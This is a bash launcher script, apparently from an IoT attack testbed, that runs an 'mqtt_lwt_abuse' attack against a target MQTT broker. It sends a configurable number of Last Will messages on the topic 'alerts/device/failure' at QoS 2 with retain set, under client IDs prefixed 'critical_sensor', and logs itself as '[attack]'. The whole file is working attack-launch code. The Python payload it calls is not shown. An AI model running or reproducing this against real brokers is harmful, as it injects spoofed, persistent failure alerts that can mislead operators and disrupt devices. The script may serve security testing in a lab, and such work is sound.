#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-${TARGET_IP:-}}"
PORT="${2:-${TARGET_PORT:-1883}}"
: "${TARGET:?target IP/FQDN required}"

COUNT="${COUNT:-30}"
DELAY_MS="${DELAY_MS:-100}"
QOS="${QOS:-2}"
RETAIN="${RETAIN:-true}"
TOPIC="${TOPIC:-alerts/device/failure}"
CLIENT_PREFIX="${CLIENT_PREFIX:-critical_sensor}"
CONNECT_TIMEOUT_S="${CONNECT_TIMEOUT_S:-3}"

export COUNT DELAY_MS QOS RETAIN TOPIC CLIENT_PREFIX CONNECT_TIMEOUT_S

echo "[attack] mqtt_lwt_abuse target=${TARGET}:${PORT} count=${COUNT} delay_ms=${DELAY_MS} qos=${QOS} retain=${RETAIN} topic=${TOPIC}"
python3 /iotzoo_attack/mqtt-lwt-abuse.py "${TARGET}" "${PORT}"
echo "[attack] mqtt_lwt_abuse completed"
